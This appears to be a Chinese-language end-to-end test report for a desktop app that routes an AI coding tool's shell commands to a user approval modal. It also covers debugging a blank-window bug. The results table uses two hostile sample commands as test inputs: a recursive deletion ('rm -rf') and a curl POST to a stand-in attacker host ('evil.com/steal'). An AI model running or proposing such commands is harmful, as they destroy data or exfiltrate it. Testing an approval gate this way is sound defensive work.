# TEST: 审批流端到端测试

**日期**: 2026-05-10
**分支**: v2-rebuild
**状态**: 通过

## 测试目标

验证 v2 审批流完整链路：bridge script → Rust watcher → Tauri event → 前端 modal → 用户操作 → 结果写回。

## 测试环境

- Tauri dev mode (`pnpm tauri dev`)
- Bridge 脚本：`bridge/claude-code-approval-bridge.sh`
- 审批目录：`~/.hermesbox/approvals/{pending,results}/`

## 问题发现

### 白屏根因

首次测试时窗口完全白色。排查发现 Vite dev server 进程已停止，但 Tauri app 进程仍在运行。应用尝试从 `http://localhost:5173` 加载前端内容，连接被拒绝导致 webview 空白。

**修复**: 重启 `pnpm tauri dev`，Vite 和 Tauri 一起启动。

### 与 v1 的差异

v1 `tauri.conf.json` 设置 `visible: false`，窗口启动时隐藏，仅在需要时显示。v2 默认 `visible: true`，Vite 崩溃时直接暴露白屏。建议后续对齐 v1 行为。

## 测试结果

| 场景 | 命令 | 桥接退出码 | pending 清理 | results 清理 |
|------|------|-----------|-------------|-------------|
| Approve | `rm -rf /tmp/test` | 0 | 通过 | 通过 |
| Approve | `curl -X POST http://evil.com/steal` | 0 | 通过 | 通过 |

## 完整数据流验证

```
1. Bridge script 写入 pending/approval-*.json  ✓
2. Rust watcher 检测文件，发出 approval-request 事件  ✓
3. 前端监听事件，弹出 ApprovalModal  ✓
4. 用户点击 Approve → invoke("approve_command")  ✓
5. Rust 写入 results/approval-*.json  ✓
6. Bridge 轮询到结果，清理文件，退出 0  ✓
```

## 代码变更

本次测试未修改代码，仅验证现有实现。

## 测试输出

```
Frontend: 133 tests passed
Rust:      37 tests passed (cargo test 未重新运行，上次通过)
```

## 后续 TODO

- [ ] Deny 测试：用户实际点击 Deny 验证退出码 1
- [ ] 超时测试：不操作等待 120 秒验证默认拒绝
- [ ] 多请求并发测试：同时发送多个审批请求
- [ ] tauri.conf.json：添加 `visible: false` 对齐 v1 行为，避免 Vite 崩溃时白屏
